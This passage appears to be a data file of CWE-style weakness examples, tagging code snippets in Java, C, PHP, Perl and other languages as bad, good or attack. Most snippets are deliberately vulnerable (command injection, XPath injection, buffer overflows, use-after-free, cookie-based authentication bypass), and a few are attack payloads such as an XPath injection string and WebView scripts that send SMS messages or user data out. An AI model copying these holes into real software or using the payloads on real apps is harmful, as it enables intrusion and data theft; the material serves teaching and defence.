// getter and setter methods for private variables
...
}

               "
609,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
if (helper == null) {

                        
synchronized (this) {
if (helper == null) {
helper = new Helper();
}
}

                     
}
return helper;

               
example: 2
NATURE:bad:
                  
helper = new Helper();

               "
610,
611,
612,
613,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
<web-app>

                        
[...snipped...]

                           
<session-config>
<session-timeout>-1</session-timeout>
</session-config>

                     
</web-app>

               "
614,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
Cookie c = new Cookie(ACCOUNT_ID, acctID);
response.addCookie(c);

               "
615,"
example: 1
NATURE:bad:
LANGUAGE:JSP:
                  
<!-- FIXME: calling this with more than 30 args kills the JDBC server -->

               "
616,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$varname = name of the temporary file on local machine
$varname_size = size of file
$varname_name = original name of file provided by client
$varname_type = MIME type of the file

               
example: 2
NATURE:bad:
LANGUAGE:PHP:
                  
$_FILES['userfile']['name'] - original filename from client
$_FILES['userfile']['tmp_name'] - the temp filename of the file on the server

               "
617,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String email = request.getParameter(""email_address"");
assert email != null;

               "
618,
619,
620,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$user = $_GET['user'];
$pass = $_GET['pass'];
$checkpass = $_GET['checkpass'];
if ($pass == $checkpass) {
SetUserPassword($user, $pass);
}

               "
621,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  

                     

                     
//Log user in, and set $isAdmin to true if user is an administrator

                     
function login($user,$pass){
$query = buildQuery($user,$pass);
mysql_query($query);
if(getUserRole($user) == ""Admin""){
$isAdmin = true;
}
}

                     
$isAdmin = false;
extract($_POST);
login(mysql_real_escape_string($user),mysql_real_escape_string($pass));

               "
622,
623,
624,
625,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
$phone = GetPhoneNumber();
if ($phone =~ /\d+-\d+/) {

                        

                           

                           
# looks like it only has hyphens and digits

                           
system(""lookup-phone $phone"");

                     
}
else {
error(""malformed number!"");
}

               "
626,
627,
628,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
function authenticate($username, $password) {

                        

                           

                           
// authenticate user

                           
...

                     
}

                     
authenticate($_POST['password'], $_POST['username']);

               
example: 2
NATURE:bad:
LANGUAGE:Perl:
                  
sub ReportAuth {
my ($username, $result, $fatal) = @_;
PrintLog(""auth: username=%s, result=%d"", $username, $result);
if (($result ne ""success"") && $fatal) {
die ""Failed!\n"";
}
}

                     
sub PrivilegedFunc
{
my $result = CheckAuth($username);
ReportAuth($username, $result, 0);
DoReallyImportantStuff();
}

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
private static final String[] ADMIN_ROLES = ...;
public boolean void accessGranted(String resource, String user) {
String[] userRoles = getUserRoles(user);
return accessGranted(resource, ADMIN_ROLES);
}

                     
private boolean void accessGranted(String resource, String[] userRoles) {

                        

                           

                           
// grant or deny access based on user roles

                           
...

                     
}

               "
636,
637,
638,
639,
640,
641,
642,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
Cookie[] cookies = request.getCookies();
for (int i =0; i< cookies.length; i++) {
Cookie c = cookies[i];
if (c.getName().equals(""authenticated"") && Boolean.TRUE.equals(c.getValue())) {
authenticated = true;
}
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
String rName = request.getParameter(""reportName"");
File rFile = new File(""/usr/local/apfr/reports/"" + rName);
...
rFile.delete();

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
fis = new FileInputStream(cfg.getProperty(""sub"")+"".txt"");
amt = fis.read(arr);
out.println(arr);

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
#define DIR ""/restricted/directory""

                     
char cmd[500];
sprintf(cmd, ""ls -l %480s"", DIR);

                     
/* Raise privileges to those needed for accessing DIR. */

                     

                     
RaisePrivileges(...);
system(cmd);
DropPrivileges(...);
...

               
example: 5
NATURE:bad:
LANGUAGE:PHP:
                  

                     

                     
//assume getCurrentUser() returns a username that is guaranteed to be alphanumeric (CWE-78)

                     
$userName = getCurrentUser();
$command = 'ps aux | grep ' . $userName;
system($command);

               
example: 6
NATURE:bad:
LANGUAGE:Perl:
                  
$ENV{""HOMEDIR""} = ""/home/mydir/public/"";
my $stream = AcceptUntrustedInputStream();
while (<$stream>) {

                        
chomp;
if (/^ENV ([\w\_]+) (.*)/) {
$ENV{$1} = $2;
}
elsif (/^QUIT/) { ... }
elsif (/^LIST/) {
open($fh, ""/bin/ls -l $ENV{HOMEDIR}|"");
while (<$fh>) {
SendOutput($stream, ""FILEINFO: $_"");
}
close($fh);
}

                     
}

               "
643,"
example: 1
NATURE:informative:
LANGUAGE:XML:
                  
<users>
<user>
<login>john</login>
<password>abracadabra</password>
<home_dir>/home/john</home_dir>
</user>
<user>
<login>cbc</login>
<password>1mgr8</password>
<home_dir>/home/cbc</home_dir>
</user>
</users>

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
XPath xpath = XPathFactory.newInstance().newXPath();
XPathExpression xlogin = xpath.compile(""//users/user[login/text()='"" + login.getUserName() + ""' and password/text() = '"" + login.getPassword() + ""']/home_dir/text()"");
Document d = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(new File(""db.xml""));
String homedir = xlogin.evaluate(d);

               
example: 3
NATURE:attack:
                  
//users/user[login/text()='john' or ''='' and password/text() = '' or ''='']/home_dir/text()

               "
644,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
response.addHeader(HEADER_NAME, untrustedRawInputData);

               "
645,
646,
647,
648,
649,
650,
651,
652,
653,
654,
655,
656,
657,
662,
663,
664,
665,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
private boolean initialized = true;
public void someMethod() {

                        
if (!initialized) {

                              

                                 

                                 
// perform initialization tasks

                                 
...

                                 
initialized = true;

                           
}

                     

                  

               
example: 2
NATURE:bad:
LANGUAGE:Perl:
                  
$username = GetCurrentUser();
$state = GetStateData($username);
if (defined($state)) {
$uid = ExtractUserID($state);
}

                     

                     
# do stuff

                     
if ($uid == 0) {
DoAdminThings();
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
char str[20];
strcat(str, ""hello world"");
printf(""%s"", str);

               "
666,
667,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
private long someLongValue;
public long getLongValue() {
return someLongValue;
}

                     
public void setLongValue(long l) {
someLongValue = l;
}

               
example: 2
NATURE:bad:
LANGUAGE:PHP:
                  
function writeToLog($message){
$logfile = fopen(""logFile.log"", ""a"");

                        
//attempt to get logfile lock

                        
if (flock($logfile, LOCK_EX)) {
fwrite($logfile,$message);

                           
// unlock logfile

                           
flock($logfile, LOCK_UN);
}
else {
print ""Could not obtain lock on logFile.log, message not recorded\n"";
}
}
fclose($logFile);

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
void f(pthread_mutex_t *mutex) {

                        
pthread_mutex_lock(mutex);

                           

                           
/* access shared resource */

                           

                           

                           
pthread_mutex_unlock(mutex);

                     
}

               
example: 4
NATURE:good:
                  
int f(pthread_mutex_t *mutex) {

                        
int result;

                           
result = pthread_mutex_lock(mutex);
if (0 != result)
return result;

                           

                           

                           
/* access shared resource */

                           

                           

                           
return pthread_mutex_unlock(mutex);

                     
}

               
example: 5
NATURE:bad:
LANGUAGE:Java:
                  
if (helper == null) {

                        
synchronized (this) {
if (helper == null) {
helper = new Helper();
}
}

                     
}
return helper;

               
example: 6
NATURE:bad:
                  
helper = new Helper();

               "
668,
669,
670,
671,
672,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char* ptr = (char*)malloc (SIZE);
if (err) {
abrt = 1;
free(ptr);
}
...
if (abrt) {
logError(""operation aborted before commit"", ptr);
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
char* ptr = (char*)malloc (SIZE);
...
if (abrt) {
free(ptr);
}
...
free(ptr);

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
#define FAIL 0
#define SUCCESS 1
#define ERROR -1
#define MAX_MESSAGE_SIZE 32

                     
int processMessage(char **message)
{

                        
int result = SUCCESS;

                           
int length = getMessageLength(message[0]);
char *messageBody;

                           
if ((length > 0) && (length < MAX_MESSAGE_SIZE)) {

                           

                              
messageBody = (char*)malloc(length*sizeof(char));
messageBody = &message[1][0];

                                 
int success = processMessageBody(messageBody);

                                 
if (success == ERROR) {
result = ERROR;
free(messageBody);
}

                           
}
else {
printf(""Unable to process message; invalid message length"");
result = FAIL;
}

                           
if (result == ERROR) {
logError(""Error processing message"", messageBody);
}

                           
return result;

                     
}

               
example: 4
NATURE:good:
LANGUAGE:C:
                  
...
messageBody = (char*)malloc(length*sizeof(char));
messageBody = &message[1][0];

                     
int success = processMessageBody(messageBody);

                     
if (success == ERROR) {
result = ERROR;
logError(""Error processing message"", messageBody);
free(messageBody);
}
...

               "
673,
674,
675,
676,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
void manipulate_string(char * string){
char buf[24];
strcpy(buf, string);
...
}

               "
680,
681,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
int i = (int) 33457.8f;

               
example: 2
NATURE:bad:
LANGUAGE:PHP:
                  
$floatVal = 1.8345;
$intVal = 3;
$result = (int)$floatVal + $intVal;

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
unsigned int readdata () {
int amount = 0;
...
if (result == ERROR)
amount = -1;
...
return amount;
}

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
unsigned int readdata () {
int amount = 0;
...
amount = accessmainframe();
...
return amount;
}

               "
682,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
img_t table_ptr; /*struct containing img data, 10kB each*/
int num_imgs;
...
num_imgs = get_num_imgs();
table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs);
...

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
...
int touchdowns = team.getTouchdowns();
int yardsGained = team.getTotalYardage();
System.out.println(team.getName() + "" averages "" + yardsGained / touchdowns + ""yards gained for every touchdown scored"");
...

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
int *p = x;
char * second_char = (char *)(p + 1);

               "
683,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
function authenticate($username, $password) {

                        

                           

                           
// authenticate user

                           
...

                     
}

                     
authenticate($_POST['password'], $_POST['username']);

               "
684,
685,
686,
687,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
sub ReportAuth {
my ($username, $result, $fatal) = @_;
PrintLog(""auth: username=%s, result=%d"", $username, $result);
if (($result ne ""success"") && $fatal) {
die ""Failed!\n"";
}
}

                     
sub PrivilegedFunc
{
my $result = CheckAuth($username);
ReportAuth($username, $result, 0);
DoReallyImportantStuff();
}

               "
688,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
private static final String[] ADMIN_ROLES = ...;
public boolean void accessGranted(String resource, String user) {
String[] userRoles = getUserRoles(user);
return accessGranted(resource, ADMIN_ROLES);
}

                     
private boolean void accessGranted(String resource, String[] userRoles) {

                        

                           

                           
// grant or deny access based on user roles

                           
...

                     
}

               "
689,
690,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
String username = getUserName();
if (username.equals(ADMIN_USER)) {
...
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
void host_lookup(char *user_supplied_addr){

                        
struct hostent *hp;
in_addr_t *addr;
char hostname[64];
in_addr_t inet_addr(const char *cp);

                           

                           
/*routine that ensures user_supplied_addr is in the right format for conversion */

                           

                           
validate_addr_form(user_supplied_addr);
addr = inet_addr(user_supplied_addr);
hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);
strcpy(hostname, hp->h_name);

                     
}

               "
691,
692,
693,
694,
695,
696,
697,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class Truck {

                        
private String make;
private String model;
private int year;

                           
public boolean equals(Object o) {

                              
if (o == null) return false;
if (o == this) return true;
if (!(o instanceof Truck)) return false;

                                 
Truck t = (Truck) o;

                                 
return (this.make.equals(t.getMake()) && this.model.equals(t.getModel()));

                           
}

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  

                     

                     
/* Ignore CWE-259 (hard-coded password) and CWE-309 (use of password system for authentication) for this example. */

                     

                     
char *username = ""admin"";
char *pass = ""password"";

                     
int AuthenticateUser(char *inUser, char *inPass) {
if (strncmp(username, inUser, strlen(inUser))) {
logEvent(""Auth failure of username using strlen of inUser"");
return(AUTH_FAIL);
}
if (! strncmp(pass, inPass, strlen(inPass))) {
logEvent(""Auth success of password using strlen of inUser"");
return(AUTH_SUCCESS);
}
else {
logEvent(""Auth fail of password using sizeof"");
return(AUTH_FAIL);
}
}

                     
int main (int argc, char **argv) {

                        
int authResult;

                           
if (argc < 3) {
ExitError(""Usage: Provide a username and password"");
}
authResult = AuthenticateUser(argv[1], argv[2]);
if (authResult == AUTH_SUCCESS) {
DoAuthenticatedTask(argv[1]);
}
else {
ExitError(""Authentication failed"");
}

                     
}

               
example: 3
NATURE:attack:
                  
p
pa
pas
pass

               "
698,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
$requestingIP = $_SERVER['REMOTE_ADDR'];
if(!in_array($requestingIP,$ipWhitelist)){
echo ""You are not authorized to view this page"";
http_redirect($errorPageURL);
}
$status = getServerStatus();
echo $status;

                     
...

                     

                  

               "
703,
704,
705,
706,
707,
708,
710,
732,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
#define OUTFILE ""hello.out""

                     
umask(0);
FILE *out;

                     
/* Ignore CWE-59 (link following) for brevity */

                     

                     
out = fopen(OUTFILE, ""w"");
if (out) {
fprintf(out, ""hello world!\n"");
fclose(out);
}

               
example: 2
NATURE:result:
                  
-rw-rw-rw- 1 username 13 Nov 24 17:58 hello.out

               
example: 3
NATURE:bad:
LANGUAGE:PHP:
                  
function createUserDir($username){
$path = '/home/'.$username;
if(!mkdir($path)){
return false;
}
if(!chown($path,$username)){
rmdir($path);
return false;
}
return true;
}

               
example: 4
NATURE:bad:
LANGUAGE:Perl:
                  
$fileName = ""secretFile.out"";

                     
if (-e $fileName) {
chmod 0777, $fileName;
}

                     
my $outFH;
if (! open($outFH, "">>$fileName"")) {
ExitError(""Couldn't append to $fileName: $!"");
}
my $dateString = FormatCurrentTime();
my $status = IsHostAlive(""cwe.mitre.org"");
print $outFH ""$dateString cwe status: $status!\n"";
close($outFH);

               
example: 5
NATURE:result:
                  
-rw-r--r-- 1 username 13 Nov 24 17:58 secretFile.out

               
example: 6
NATURE:result:
                  
-rw-rw-rw- 1 username 13 Nov 24 17:58 secretFile.out

               
example: 7
NATURE:bad:
LANGUAGE:Shell:
                  
chmod -R ugo+r DIRNAME

               "
733,
749,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public void removeDatabase(String databaseName) {

                        
try {

                              
Statement stmt = conn.createStatement();
stmt.execute(""DROP DATABASE "" + databaseName);

                              

                           
} catch (SQLException ex) {...}

                     
}

               
example: 2
NATURE:good:
LANGUAGE:Java:
                  
private void removeDatabase(String databaseName) {

                        
try {

                              
Statement stmt = conn.createStatement();
stmt.execute(""DROP DATABASE "" + databaseName);

                              

                           
} catch (SQLException ex) {...}
}

                     

                  

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  

                     

                     
// Android

                     
@Override
public boolean shouldOverrideUrlLoading(WebView view, String url){

                        
if (url.substring(0,14).equalsIgnoreCase(""examplescheme:"")){
if(url.substring(14,25).equalsIgnoreCase(""getUserInfo"")){
writeDataToView(view, UserData);
return false;
}
else{
return true;
}
}

                     
}

               
example: 4
NATURE:bad:
LANGUAGE:Objective-C:
                  

                     

                     
// iOS

                     
-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType
{

                        
NSURL *URL = [exRequest URL];
if ([[URL scheme] isEqualToString:@""exampleScheme""])
{

                              
NSString *functionString = [URL resourceSpecifier];
if ([functionString hasPrefix:@""specialFunction""])
{

                                    

                                       

                                       
// Make data available back in webview.

                                       
UIWebView *webView = [self writeDataToView:[URL query]];

                                 
}
return NO;

                           
}
return YES;

                     
}

               
example: 5
NATURE:attack:
LANGUAGE:JavaScript:
                  
window.location = examplescheme://method?parameter=value

               
example: 6
NATURE:bad:
LANGUAGE:Java:
                  
public class WebViewGUI extends Activity {

                        
WebView mainWebView;

                           
public void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
mainWebView = new WebView(this);
mainWebView.getSettings().setJavaScriptEnabled(true);
mainWebView.addJavascriptInterface(new JavaScriptInterface(), ""userInfoObject"");
mainWebView.loadUrl(""file:///android_asset/www/index.html"");
setContentView(mainWebView);
}

                           
final class JavaScriptInterface {

                              
JavaScriptInterface () {}

                                 
public String getUserInfo() {
return currentUser.Info();
}

                           
}

                     
}

               
example: 7
NATURE:attack:
LANGUAGE:JavaScript:
                  
<script>
userInfoObject.getClass().forName('android.telephony.SmsManager').getMethod('getDefault',null).sendTextMessage(attackNumber, null, attackMessage, null, null);
</script>

               
example: 8
NATURE:bad:
LANGUAGE:Java:
                  
final class JavaScriptInterface {

                        
JavaScriptInterface () { }

                           
@JavascriptInterface
public String getUserInfo() {
return currentUser.Info();
}

                     
}

               
example: 9
NATURE:attack:
LANGUAGE:JavaScript:
                  
<script>
var info = window.userInfoObject.getUserInfo();
sendUserInfo(info);
</script>

               "
754,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char buf[10], cp_buf[10];
fgets(buf, 10, stdin);
strcpy(cp_buf, buf);

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
buf = (char*) malloc(req_size);
strncpy(buf, xfer, req_size);

               
example: 3
NATURE:bad:
LANGUAGE:C#:
                  
char[] byteArray = new char[1024];
for (IEnumerator i=users.GetEnumerator(); i.MoveNext() ;i.Current()) {
String userName = (String) i.Current();
String pFileName = PFILE_ROOT + ""/"" + userName;
StreamReader sr = new StreamReader(pFileName);
sr.Read(byteArray,0,1024);//the file is always 1k bytes
sr.Close();
processPFile(userName, byteArray);
}

               
example: 4
NATURE:bad:
LANGUAGE:Java:
                  
FileInputStream fis;
byte[] byteArray = new byte[1024];
for (Iterator i=users.iterator(); i.hasNext();) {

                        
String userName = (String) i.next();
String pFileName = PFILE_ROOT + ""/"" + userName;
FileInputStream fis = new FileInputStream(pFileName);
fis.read(byteArray); // the file is always 1k bytes
fis.close();
processPFile(userName, byteArray);

                        

                     

                  

               
example: 5
NATURE:bad:
LANGUAGE:Java:
                  
String itemName = request.getParameter(ITEM_NAME);
if (itemName.compareTo(IMPORTANT_ITEM) == 0) {
...
}
...

               
example: 6
NATURE:bad:
LANGUAGE:Java:
                  
String itemName = request.Item(ITEM_NAME);
if (itemName.Equals(IMPORTANT_ITEM)) {
...
}
...

               
example: 7
NATURE:bad:
LANGUAGE:Java:
                  
System.clearProperty(""os.name"");
...
String os = System.getProperty(""os.name"");
if (os.equalsIgnoreCase(""Windows 95"")) System.out.println(""Not supported"");

               
example: 8
NATURE:bad:
LANGUAGE:C#:
                  
Dim MyFile As New FileStream(""myfile.txt"", FileMode.Open, FileAccess.Read, FileShare.Read)
Dim MyArray(50) As Byte
MyFile.Read(MyArray, 0, 50)
DoDangerousOperation(MyArray(20))

               
example: 9
NATURE:bad:
LANGUAGE:C:
                  
void host_lookup(char *user_supplied_addr){

                        
struct hostent *hp;
in_addr_t *addr;
char hostname[64];
in_addr_t inet_addr(const char *cp);

                           

                           
/*routine that ensures user_supplied_addr is in the right format for conversion */

                           

                           
validate_addr_form(user_supplied_addr);
addr = inet_addr(user_supplied_addr);
hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);
strcpy(hostname, hp->h_name);

                     
}

               
example: 10
NATURE:bad:
LANGUAGE:C++:
                  
int outputStringToFile(char *output, char *filename) {

                        

                           
openFileToWrite(filename);
writeToFile(output);
closeFile(filename);

                     
}

               
example: 11
NATURE:good:
LANGUAGE:C++:
                  
int outputStringToFile(char *output, char *filename) {

                        
int isOutput = SUCCESS;

                           
int isOpen = openFileToWrite(filename);
if (isOpen == FAIL) {
printf(""Unable to open file %s"", filename);
isOutput = FAIL;
}
else {

                              
int isWrite = writeToFile(output);
if (isWrite == FAIL) {
printf(""Unable to write to file %s"", filename);
isOutput = FAIL;
}

                                 
int isClose = closeFile(filename);
if (isClose == FAIL)
isOutput = FAIL;

                              

                           
}
return isOutput;

                     
}

               
example: 12
NATURE:bad:
LANGUAGE:Java:
                  
private File readFile = null;

                     
public void setInputFile(String inputFile) {

                        

                           

                           
// create readFile File object from string containing name of file

                           

                        

                     
}

                     
public void readFromFile() {

                        
try {

                              
reader = new FileReader(readFile);

                                 

                                 
// read input file

                                 

                              

                           
} catch (FileNotFoundException ex) {...}

                     
}

               
example: 13
NATURE:good:
LANGUAGE:Java:
                  
private File readFile = null;

                     
public void setInputFile(String inputFile) {

                        

                           

                           
// create readFile File object from string containing name of file

                           

                        

                     
}

                     
public void readFromFile() {

                        
try {

                              
if (readFile == null) {
System.err.println(""Input file has not been set, call setInputFile method before calling openInputFile"");
throw NullPointerException;
}

                                 
reader = new FileReader(readFile);

                                 

                                 
// read input file

                                 

                              

                           
} catch (FileNotFoundException ex) {...}
catch (NullPointerException ex) {...}

                     
}

               "
755,
756,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
Public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
try {
...
} catch (ApplicationSpecificException ase) {
logger.error(""Caught: "" + ase.toString());
}
}

               
example: 2
NATURE:bad:
LANGUAGE:ASP.NET:
                  
<customErrors mode=""Off"" />

               
example: 3
NATURE:good:
LANGUAGE:ASP.NET:
                  
<customErrors mode=""RemoteOnly"" />

               "
757,
758,
759,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
unsigned char *check_passwd(char *plaintext) {
ctext = simple_digest(""sha1"",plaintext,strlen(plaintext), ... );

                        
//Login if hash matches stored hash

                        
if (equal(ctext, secret_password())) {
login_user();
}
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
String plainText = new String(plainTextIn);
MessageDigest encer = MessageDigest.getInstance(""SHA"");
encer.update(plainTextIn);
byte[] digest = password.digest();

                     
//Login if hash matches stored hash

                     
if (equal(digest,secret_password())) {
login_user();
}

               
example: 3
NATURE:bad:
LANGUAGE:Python:
                  
def storePassword(userName,Password):
hasher = hashlib.new('md5')
hasher.update(Password)
hashedPassword = hasher.digest()

                        

                        
# UpdateUserLogin returns True on success, False otherwise

                        
return updateUserLogin(userName,hashedPassword)

                  

               
example: 4
NATURE:good:
LANGUAGE:Python:
                  
def storePassword(userName,Password):
hasher = hashlib.new('md5',b'SaltGoesHere')
hasher.update(Password)
hashedPassword = hasher.digest()

                        

                        
# UpdateUserLogin returns True on success, False otherwise

                        
return updateUserLogin(userName,hashedPassword)

                  

               "
760,
761,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
#define SUCCESS (1)
#define FAILURE (0)

                     
int contains_char(char c){

                        
char *str;
str = (char*)malloc(20*sizeof(char));
strcpy(str, ""Search Me!"");
while( *str != NULL){

                              
if( *str == c ){

                                    

                                       

                                       
/* matched char, free string and return success */

                                       
free(str);
return SUCCESS;

                                 
}

                                 
/* didn't match yet, increment pointer and try next char */

                                 

                                 
str = str + 1;

                           
}

                           
/* we did not match the char in the string, free mem and return failure */

                           

                           
free(str);
return FAILURE;

                     
}

               
example: 2
NATURE:good:
LANGUAGE:C:
                  
#define SUCCESS (1)
#define FAILURE (0)

                     
int cointains_char(char c){

                        
char *str;
int i = 0;
str = (char*)malloc(20*sizeof(char));
strcpy(str, ""Search Me!"");
while( i < strlen(str) ){

                              
if( str[i] == c ){

                                    

                                       

                                       
/* matched char, free string and return success */

                                       
free(str);
return SUCCESS;

                                 
}

                                 
/* didn't match yet, increment pointer and try next char */

                                 

                                 
i = i + 1;

                           
}

                           
/* we did not match the char in the string, free mem and return failure */

                           

                           
free(str);
return FAILURE;

                     
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
char **ap, *argv[10], *inputstring;
for (ap = argv; (*ap = strsep(&inputstring, "" \t"")) != NULL;)

                        
if (**ap != '\0')
if (++ap >= &argv[10])
break;

                           

                        

                     

                     
/.../
free(ap[4]);

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  

                     

                     
//hardcode input length for simplicity

                     
char* input = (char*) malloc(40*sizeof(char));
char *tok;
char* sep = "" \t"";

                     
get_user_input( input );

                     

                     
/* The following loop will parse and process each token in the input string */

                     

                     
tok = strtok( input, sep);
while( NULL != tok ){

                        
if( isMalformed( tok ) ){

                              

                                 

                                 
/* ignore and discard bad data */

                                 
free( tok );

                           
}
else{
add_to_command_queue( tok );
}
tok = strtok( NULL, sep));

                     
}

               
example: 5
NATURE:good:
LANGUAGE:C:
                  

                     

                     
//hardcode input length for simplicity

                     
char* input = (char*) malloc(40*sizeof(char));
char *tok, *command;
char* sep = "" \t"";

                     
get_user_input( input );

                     

                     
/* The following loop will parse and process each token in the input string */

                     

                     
tok = strtok( input, sep);
while( NULL != tok ){

                        
if( !isMalformed( command ) ){

                              

                                 

                                 
/* copy and enqueue good data */

                                 
command = (char*) malloc( (strlen(tok) + 1) * sizeof(char) );
strcpy( command, tok );
add_to_command_queue( command );

                           
}
tok = strtok( NULL, sep));

                     
}

                     
free( input )

               "
762,"
example: 1
NATURE:bad:
LANGUAGE:C++:
                  
void foo(){

                        
BarObj *ptr = new BarObj()

                           
/* do some work with ptr here */

                           

                           
...

                           
free(ptr);

                     
}

               
example: 2
NATURE:good:
LANGUAGE:C++:
                  
void foo(){

                        
BarObj *ptr = new BarObj()

                           
/* do some work with ptr here */

                           

                           
...

                           
delete ptr;

                     
}

               
example: 3
NATURE:bad:
LANGUAGE:C++:
                  
class A {
void foo();
};
void A::foo(){
int *ptr;
ptr = (int*)malloc(sizeof(int));
delete ptr;
}

               
example: 4
NATURE:bad:
LANGUAGE:C++:
                  
class A{
void foo(bool);
};
void A::foo(bool heap) {
int localArray[2] = {
11,22
};
int *p = localArray;
if (heap){
p = new int[2];
}
delete[] p;
}

               "
763,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char **ap, *argv[10], *inputstring;
for (ap = argv; (*ap = strsep(&inputstring, "" \t"")) != NULL;)

                        
if (**ap != '\0')
if (++ap >= &argv[10])
break;

                           

                        

                     

                     
/.../
free(ap[4]);

               
example: 2
NATURE:bad:
LANGUAGE:C++:
                  
void foo(){

                        
BarObj *ptr = new BarObj()

                           
/* do some work with ptr here */

                           

                           
...

                           
free(ptr);

                     
}

               
example: 3
NATURE:good:
LANGUAGE:C++:
                  
void foo(){

                        
BarObj *ptr = new BarObj()

                           
/* do some work with ptr here */

                           

                           
...

                           
delete ptr;

                     
}

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
#define SUCCESS (1)
#define FAILURE (0)

                     
int contains_char(char c){

                        
char *str;
str = (char*)malloc(20*sizeof(char));
strcpy(str, ""Search Me!"");
while( *str != NULL){

                              
if( *str == c ){

                                    

                                       

                                       
/* matched char, free string and return success */

                                       
free(str);
return SUCCESS;

                                 
}

                                 
/* didn't match yet, increment pointer and try next char */

                                 

                                 
str = str + 1;

                           
}

                           
/* we did not match the char in the string, free mem and return failure */

                           

                           
free(str);
return FAILURE;

                     
}

               
example: 5
NATURE:good:
LANGUAGE:C:
                  
#define SUCCESS (1)
#define FAILURE (0)

                     
int cointains_char(char c){

                        
char *str;
int i = 0;
str = (char*)malloc(20*sizeof(char));
strcpy(str, ""Search Me!"");
while( i < strlen(str) ){

                              
if( str[i] == c ){

                                    

                                       

                                       
/* matched char, free string and return success */

                                       
free(str);
return SUCCESS;

                                 
}

                                 
/* didn't match yet, increment pointer and try next char */

                                 

                                 
i = i + 1;

                           
}

                           
/* we did not match the char in the string, free mem and return failure */

                           

                           
free(str);
return FAILURE;

                     
}

               
example: 6
NATURE:bad:
LANGUAGE:C:
                  

                     

                     
//hardcode input length for simplicity

                     
char* input = (char*) malloc(40*sizeof(char));
char *tok;
char* sep = "" \t"";

                     
get_user_input( input );

                     

                     
/* The following loop will parse and process each token in the input string */

                     

                     
tok = strtok( input, sep);
while( NULL != tok ){

                        
if( isMalformed( tok ) ){

                              

                                 

                                 
/* ignore and discard bad data */

                                 
free( tok );

                           
}
else{
add_to_command_queue( tok );
}
tok = strtok( NULL, sep));

                     
}

               
example: 7
NATURE:good:
LANGUAGE:C:
                  

                     

                     
//hardcode input length for simplicity

                     
char* input = (char*) malloc(40*sizeof(char));
char *tok, *command;
char* sep = "" \t"";

                     
get_user_input( input );

                     

                     
/* The following loop will parse and process each token in the input string */

                     

                     
tok = strtok( input, sep);
while( NULL != tok ){

                        
if( !isMalformed( command ) ){

                              

                                 

                                 
/* copy and enqueue good data */

                                 
command = (char*) malloc( (strlen(tok) + 1) * sizeof(char) );
strcpy( command, tok );
add_to_command_queue( command );

                           
}
tok = strtok( NULL, sep));

                     
}

                     
free( input )

               "
764,
765,
766,"
example: 1
NATURE:bad:
LANGUAGE:C++:
                  
public: char* password;

               
example: 2
NATURE:good:
LANGUAGE:C++:
                  
private: char* password;

               
example: 3
NATURE:bad:
LANGUAGE:C++:
                  
#define MAX_PASSWORD_LENGTH 15
#define MAX_USERNAME_LENGTH 15

                     
class UserAccount
{

                        
public:

                              
UserAccount(char *username, char *password)
{
if ((strlen(username) > MAX_USERNAME_LENGTH) ||
(strlen(password) > MAX_PASSWORD_LENGTH)) {
ExitError(""Invalid username or password"");
}
strcpy(this->username, username);
strcpy(this->password, password);
}

                           

                           

                           
int authorizeAccess(char *username, char *password)
{

                              
